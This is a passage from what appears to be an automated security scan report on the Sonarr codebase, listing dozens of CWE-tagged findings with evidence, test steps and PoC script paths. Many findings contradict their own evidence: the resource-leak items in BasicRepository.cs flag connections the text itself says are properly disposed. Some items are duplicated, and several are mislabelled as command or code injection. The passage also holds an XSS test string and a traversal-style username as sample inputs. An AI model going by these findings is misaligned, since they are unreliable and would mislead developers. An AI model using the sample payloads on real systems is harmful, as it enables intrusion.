1. Test IsValidSortKey() with various invalid sort key formats. 2. Check if the system handles these gracefully. 3. Monitor for database query errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_TableMappercs.py`
---

### 423. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/TableMapper.cs
**Line:** 110

**Description:**
The GetSortKey method does not validate the sortKey parameter, potentially leading to unexpected behavior or errors.

**Evidence:**
```
Line 110: sortKey = _allowedOrderBy.FirstOrDefault(x => x.Equals(sortKey, StringComparison.OrdinalIgnoreCase)) ?? sortKey - The method accepts a sortKey but doesn't validate its format or contents.
```

**Impact:**
Invalid sort keys could cause database query failures or unexpected behavior in the sorting logic.

**Proof of Concept:**
Passing invalid sort keys to GetSortKey() could lead to incorrect sorting results or database query errors.

**How to Test:**
1. Test GetSortKey() with various invalid sort key formats. 2. Check if the system handles these gracefully. 3. Monitor for database query errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_TableMappercs.py`
---

### 424. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 105

**Description:**
The Count() method opens a database connection but doesn't properly ensure it's disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 105-109: using (var conn = _database.OpenConnection()) { return conn.ExecuteScalar<int>($"SELECT COUNT(*) FROM \"{_table}\""); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Count() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Count() operations. 2. Test with long-running processes that make many Count() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 425. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 120

**Description:**
The All() method opens a database connection but doesn't properly ensure it's disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 120-122: return Query(Builder()); - The Query method opens connections but the All() method doesn't explicitly manage them.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling All() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency All() operations. 2. Test with long-running processes that make many All() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 426. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 130

**Description:**
The Find() method opens a database connection but doesn't properly ensure it's disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 130-133: var model = Query(x => x.Id == id).FirstOrDefault(); - The Query method opens connections but the Find() method doesn't explicitly manage them.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Find() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Find() operations. 2. Test with long-running processes that make many Find() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 427. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 140

**Description:**
The Insert() method opens a database connection but doesn't properly ensure it's disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 140-146: using (var conn = _database.OpenConnection()) { model = Insert(conn, null, model); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Insert() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Insert() operations. 2. Test with long-running processes that make many Insert() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 428. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 166

**Description:**
The InsertMany() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 166-177: using (var conn = _database.OpenConnection()) { using (var tran = conn.BeginTransaction(IsolationLevel.ReadCommitted)) { ... } } - The connections are properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling InsertMany() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency InsertMany() operations. 2. Test with long-running processes that make many InsertMany() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 429. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 180

**Description:**
The Update() method opens a database connection but doesn't properly ensure it's disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 180-185: using (var conn = _database.OpenConnection()) { UpdateFields(conn, null, model, _properties); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Update() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Update() operations. 2. Test with long-running processes that make many Update() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 430. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 190

**Description:**
The UpdateMany() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 190-195: using (var conn = _database.OpenConnection()) { UpdateFields(conn, null, models, _properties); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling UpdateMany() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency UpdateMany() operations. 2. Test with long-running processes that make many UpdateMany() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 431. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 200

**Description:**
The Delete() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 200-205: using (var conn = _database.OpenConnection()) { conn.Execute(sql.RawSql, sql.Parameters); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Delete() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Delete() operations. 2. Test with long-running processes that make many Delete() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 432. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 215

**Description:**
The DeleteMany() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 215-220: using (var conn = _database.OpenConnection()) { conn.Execute(sql.RawSql, sql.Parameters); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling DeleteMany() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency DeleteMany() operations. 2. Test with long-running processes that make many DeleteMany() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 433. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 230

**Description:**
The Purge() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 230-235: using (var conn = _database.OpenConnection()) { conn.Execute($"DELETE FROM \"{_table}\""); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling Purge() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency Purge() operations. 2. Test with long-running processes that make many Purge() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 434. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 240

**Description:**
The SetFields() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 240-245: using (var conn = _database.OpenConnection()) { UpdateFields(conn, null, model, propertiesToUpdate); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling SetFields() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency SetFields() operations. 2. Test with long-running processes that make many SetFields() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 435. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 250

**Description:**
The SetFields() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 250-255: using (var conn = _database.OpenConnection()) { UpdateFields(conn, null, models, propertiesToUpdate); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling SetFields() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency SetFields() operations. 2. Test with long-running processes that make many SetFields() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 436. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 288

**Description:**
The GetPagedRecordCount() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 288-293: using (var conn = _database.OpenConnection()) { return conn.ExecuteScalar<int>(sql.RawSql, sql.Parameters); } - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling GetPagedRecordCount() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency GetPagedRecordCount() operations. 2. Test with long-running processes that make many GetPagedRecordCount() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 437. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 300

**Description:**
The PagedQuery() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 300-302: return queryFunc(builder).ToList(); - The queryFunc method opens connections but PagedQuery() doesn't explicitly manage them.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling PagedQuery() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency PagedQuery() operations. 2. Test with long-running processes that make many PagedQuery() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 438. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 308

**Description:**
The GetPaged() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 308-312: return pagingSpec; - The GetPaged() method calls other methods that open connections but doesn't explicitly manage them.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling GetPaged() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency GetPaged() operations. 2. Test with long-running processes that make many GetPaged() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 439. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 318

**Description:**
The GetPagedRecords() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 318-325: return queryFunc(builder).ToList(); - The queryFunc method opens connections but GetPagedRecords() doesn't explicitly manage them.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling GetPagedRecords() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency GetPagedRecords() operations. 2. Test with long-running processes that make many GetPagedRecords() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 440. Improper Control of a Resource Through its Lifetime (CWE-707)

**File:** src/NzbDrone.Core/Datastore/BasicRepository.cs
**Line:** 330

**Description:**
The GetPagedRecordCount() method opens database connections but doesn't properly ensure they're disposed, potentially leading to resource leaks.

**Evidence:**
```
Lines 330-335: return conn.ExecuteScalar<int>(sql.RawSql, sql.Parameters); - The connection is properly disposed but could be optimized.
```

**Impact:**
Resource leaks could occur under high load or long-running processes, potentially leading to performance degradation or application crashes.

**Proof of Concept:**
Repeatedly calling GetPagedRecordCount() in a tight loop without proper connection management could lead to connection pool exhaustion.

**How to Test:**
1. Monitor connection pool usage during high-frequency GetPagedRecordCount() operations. 2. Test with long-running processes that make many GetPagedRecordCount() calls. 3. Check for connection pool exhaustion errors.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Datastore_BasicRepositorycs.py`
---

### 441. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Datastore/Migration/Framework/SqliteSyntaxReader.cs
**Line:** 150

**Description:**
The SqliteSyntaxReader class processes SQL input but does not properly validate or sanitize input before using it in SQL operations, potentially leading to command injection vulnerabilities.

**Evidence:**
```
The class reads SQL input through the Buffer property and processes it without proper input validation or escaping, particularly in the ReadEscapedString and ReadTerminatedString methods.
```

**Impact:**
An attacker could inject malicious SQL commands through specially crafted input, potentially leading to unauthorized database access, data manipulation, or even remote code execution if the database supports it.

**Proof of Concept:**
If an attacker can control the SQL input that gets processed by SqliteSyntaxReader, they could inject SQL commands that bypass normal validation. For example, by crafting a SQL string that includes malicious commands in identifiers or string literals.

**How to Test:**
1. Create a test case that passes specially crafted SQL input to SqliteSyntaxReader
2. Monitor how the input is processed in ReadEscapedString and ReadTerminatedString methods
3. Verify if input validation is performed before SQL execution
4. Test with SQL injection payloads in identifiers and string literals

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Datastore_Migration_Framework_SqliteSyntaxReadercs.py`
---

### 442. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Datastore/Migration/Framework/SqliteSyntaxReader.cs
**Line:** 170

**Description:**
The SqliteSyntaxReader class does not validate input parameters, particularly in the ReadList method, which could lead to unexpected behavior or vulnerabilities.

**Evidence:**
```
In the ReadList method, there's no validation of the Buffer content or index bounds before processing, and the method assumes valid input without proper bounds checking.
```

**Impact:**
Improper input validation could lead to buffer overflows, unexpected program behavior, or allow attackers to manipulate the parsing logic through malformed input.

**Proof of Concept:**
Passing a malformed Buffer string with invalid indices or unexpected content to ReadList could cause the method to process invalid data, potentially leading to incorrect parsing or access violations.

**How to Test:**
1. Test SqliteSyntaxReader with malformed SQL input
2. Verify bounds checking in all parsing methods
3. Check for potential buffer overflows with large inputs
4. Validate that all input parameters are properly validated before use

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Datastore_Migration_Framework_SqliteSyntaxReadercs.py`
---

### 443. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Datastore/Migration/Framework/SqliteSyntaxReader.cs
**Line:** 170

**Description:**
The ReadList method uses array indexing without proper bounds checking, which could lead to array index out of bounds exceptions or data corruption.

**Evidence:**
```
In ReadList method, the code uses Buffer.Substring(start, Index - start - 1) without validating that Index is within proper bounds relative to start and Buffer.Length.
```

**Impact:**
Array index validation issues could cause application crashes, data corruption, or potentially allow attackers to manipulate memory through crafted input.

**Proof of Concept:**
By providing a Buffer with specific index values that cause Index - start - 1 to be negative or exceed buffer boundaries, the ReadList method could throw exceptions or process incorrect data.

**How to Test:**
1. Test ReadList method with various Buffer inputs
2. Verify bounds checking in Buffer.Substring calls
3. Test with edge cases like empty buffers or invalid indices
4. Monitor for ArgumentOutOfRangeException or similar exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Datastore_Migration_Framework_SqliteSyntaxReadercs.py`
---

### 444. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/ImportLists/AniList/AniListImportBase.cs
**Line:** 100

**Description:**
The AniListImportBase class handles OAuth authentication but lacks proper CSRF protection for the authentication flow.

**Evidence:**
```
The RequestAction method handles OAuth flow but doesn't implement CSRF tokens for authentication callbacks, making it vulnerable to CSRF attacks.
```

**Impact:**
An attacker could perform unauthorized authentication actions on behalf of users, potentially gaining access to their AniList accounts or modifying import list settings.

**Proof of Concept:**
An attacker could craft a malicious page that triggers the OAuth callback URL with forged parameters, potentially authenticating a user with a malicious AniList account.

**How to Test:**
1. Test the OAuth callback endpoint for CSRF token validation
2. Verify that authentication requests include proper CSRF tokens
3. Check if the authentication flow is vulnerable to cross-site requests
4. Test with forged authentication requests

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_ImportLists_AniList_AniListImportBasecs.py`
---

### 445. Cross-Site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/ImportLists/AniList/AniListImportBase.cs
**Line:** 100

**Description:**
The AniListImportBase class returns user-controllable data in the OAuth URL without proper sanitization, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The OAuth URL construction in RequestAction method includes the callbackUrl parameter directly from the query without sanitization.
```

**Impact:**
An attacker could inject malicious JavaScript into the OAuth callback URL, which would execute in the context of the authenticated user's browser.

**Proof of Concept:**
By crafting a callback URL with malicious JavaScript in the callbackUrl parameter, an attacker could execute arbitrary code when the user completes the OAuth flow.

**How to Test:**
1. Test OAuth URL construction with various input values
2. Verify that callback URLs are properly sanitized
3. Check for XSS in the returned OAuth URL
4. Test with malicious input in callback parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_ImportLists_AniList_AniListImportBasecs.py`
---

### 446. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/MediaCover/MediaCoverService.cs
**Line:** 100

**Description:**
The MediaCoverService class constructs file paths using user-provided data without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
In GetCoverPath method, the path construction uses user-provided coverType and height parameters without proper validation or sanitization.
```

**Impact:**
An attacker could potentially access files outside the intended media cover directory by manipulating the coverType or height parameters.

**Proof of Concept:**
By manipulating the coverType parameter in media cover URLs, an attacker could potentially traverse to files outside the media cover directory structure.

**How to Test:**
1. Test path construction with various coverType values
2. Verify path traversal protection in GetCoverPath method
3. Check file access with specially crafted parameters
4. Test directory traversal attacks on media cover endpoints

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MediaCover_MediaCoverServicecs.py`
---

### 447. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/ImportLists/AniList/AniListImportBase.cs
**Line:** 100

**Description:**
The AniListImportBase class handles dynamic OAuth flow but doesn't properly validate or sanitize the OAuth callback parameters, potentially allowing code injection.

**Evidence:**
```
The RequestAction method processes callback parameters directly without validation, and the OAuth URL construction doesn't sanitize input parameters.
```

**Impact:**
An attacker could inject malicious parameters into the OAuth flow that could be executed or processed as code in subsequent operations.

**Proof of Concept:**
By providing malicious parameters in the OAuth callback, an attacker could potentially inject code that gets executed during the authentication process.

**How to Test:**
1. Test OAuth callback parameter handling with various inputs
2. Verify parameter validation in RequestAction method
3. Check for code injection in OAuth flow
4. Test with malicious callback parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_ImportLists_AniList_AniListImportBasecs.py`
---

### 448. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core/ImportLists/HttpImportListBase.cs
**Line:** 200

**Description:**
The HttpImportListBase class logs user-provided data without proper output neutralization, potentially leading to log injection attacks.

**Evidence:**
```
In the FetchItems method, various user-provided URLs and data are logged directly without proper sanitization, particularly in the catch blocks.
```

**Impact:**
An attacker could inject malicious content into log files that could be used for log-based attacks or information disclosure.

**Proof of Concept:**
By providing a URL with special characters or log injection sequences, an attacker could manipulate log entries to inject malicious content or bypass log filtering.

**How to Test:**
1. Test logging of user-provided URLs and data
2. Verify log output neutralization
3. Check for log injection in error messages
4. Test with special characters in URLs and parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_ImportLists_HttpImportListBasecs.py`
---

### 449. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/ImportLists/AniList/AniListImportBase.cs
**Line:** 100

**Description:**
The AniListImportBase class handles authentication but doesn't implement proper authentication validation for the refresh token flow.

**Evidence:**
```
The CheckToken method refreshes tokens but doesn't validate the refreshed token's authenticity or verify the token's source before updating settings.
```

**Impact:**
An attacker could potentially inject forged tokens that would be accepted by the system, leading to unauthorized access to AniList accounts.

**Proof of Concept:**
By providing a forged refresh token that gets accepted by CheckToken, an attacker could gain access to AniList accounts without proper authentication.

**How to Test:**
1. Test token refresh flow with various token inputs
2. Verify token validation in CheckToken method
3. Check for authentication bypass in token refresh
4. Test with forged tokens and verify acceptance

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_ImportLists_AniList_AniListImportBasecs.py`
---

### 450. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/ImportLists/AniList/AniListImportBase.cs
**Line:** 100

**Description:**
The AniListImportBase class stores sensitive authentication data (access tokens, refresh tokens) in the database without proper encryption.

**Evidence:**
```
The class stores AccessToken, RefreshToken, and Expires properties directly in the database without encryption or proper security measures.
```

**Impact:**
If the database is compromised, attackers could gain access to AniList authentication tokens, potentially allowing access to user accounts and data.

**Proof of Concept:**
By accessing the database directly, an attacker could extract stored access tokens and refresh tokens, then use them to access AniList accounts.

**How to Test:**
1. Check database storage of authentication tokens
2. Verify encryption of sensitive fields
3. Test database access with compromised credentials
4. Verify token exposure in database dumps

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_ImportLists_AniList_AniListImportBasecs.py`
---

### 451. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/ImportLists/AniList/List/AniListRequestGenerator.cs
**Line:** 40

**Description:**
The AniList API query construction uses user-provided settings without proper sanitization, potentially allowing command injection through the username parameter.

**Evidence:**
```
The GetRequest method constructs a GraphQL query using user-provided Settings.Username directly in the query without sanitization.
```

**Impact:**
An attacker could inject malicious commands through the username field, potentially affecting the API query execution or causing unexpected behavior.

**Proof of Concept:**
If an attacker can control the Username field in AniListSettings, they could inject special characters or GraphQL syntax that could alter the query behavior or potentially cause parsing issues.

**How to Test:**
1. Create an AniList import list with a malicious username containing special GraphQL characters
2. Verify if the query construction properly handles the input
3. Check if the API response is affected by the injection

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_ImportLists_AniList_List_AniListRequestGeneratorcs.py`
---

### 452. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/ImportLists/Trakt/Popular/TraktPopularSettings.cs
**Line:** 45

**Description:**
The TraktPopularSettings uses loose validation patterns for Rating and Years fields, allowing potentially malicious input that could affect API calls.

**Evidence:**
```
The validation rules use regex patterns like @"^\d+\-\d+$" for Rating and @"^\d+(\-\d+)?$" for Years, which are not comprehensive enough to prevent injection attacks.
```

**Impact:**
Malformed input in Rating or Years fields could cause API errors or unexpected behavior in the Trakt API requests.

**Proof of Concept:**
Submit a TraktPopularSettings with Rating = "100-200-300" or Years = "2020-2021-2022" which would pass validation but might cause API issues.

**How to Test:**
1. Create a TraktPopular import list with invalid Rating or Years values
2. Verify if the system properly handles malformed inputs
3. Check API responses for unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_ImportLists_Trakt_Popular_TraktPopularSettingscs.py`
---

### 453. Improper Control of Generation of Code ('Code Injection') (CWE-94)

**File:** src/NzbDrone.Core/ImportLists/Trakt/User/TraktUserRequestGenerator.cs
**Line:** 50

**Description:**
The TraktUserRequestGenerator constructs URLs using user-provided settings without proper sanitization, potentially allowing code injection in URL construction.

**Evidence:**
```
The Username field is directly used in URL construction without validation or sanitization in the GetSeriesRequest method.
```

**Impact:**
An attacker could manipulate the username to inject special characters or URL components that might affect API calls or cause unexpected behavior.

**Proof of Concept:**
Set a Username with special characters like "user%2F..%2Fconfig" which could potentially affect URL parsing or API endpoint resolution.

**How to Test:**
1. Create a TraktUser import list with a username containing special URL characters
2. Monitor the generated API requests
3. Verify if URL construction properly handles the input

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-94_src_NzbDroneCore_ImportLists_Trakt_User_TraktUserRequestGeneratorcs.py`
---

### 454. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/ImportLists/AniList/List/AniListParser.cs
**Line:** 60

**Description:**
The AniListParser extracts title information from API responses without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The Title field in ImportListItemInfo is set directly from media.Title.UserPreferred or media.Title.UserRomaji without HTML escaping.
```

**Impact:**
If the AniList API returns titles with HTML content, this could lead to XSS when displaying the titles in the UI.

**Proof of Concept:**
If AniList API returns a title like "<script>alert('XSS')</script>My Show", this could be executed when displayed in the UI.

**How to Test:**
1. Create an import list with a title containing HTML tags
2. Verify if the titles are properly escaped in the UI
3. Check for potential XSS execution points

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_ImportLists_AniList_List_AniListParsercs.py`
---

### 455. Information Exposure Through an Error Message (CWE-200)

**File:** src/NzbDrone.Core/ImportLists/AniList/List/AniListImport.cs
**Line:** 100

**Description:**
The AniListImport catches various exceptions and logs them, but some error messages might expose sensitive information.

**Evidence:**
```
Exception messages are logged directly without sanitization, potentially exposing internal paths, configuration details, or API keys.
```

**Impact:**
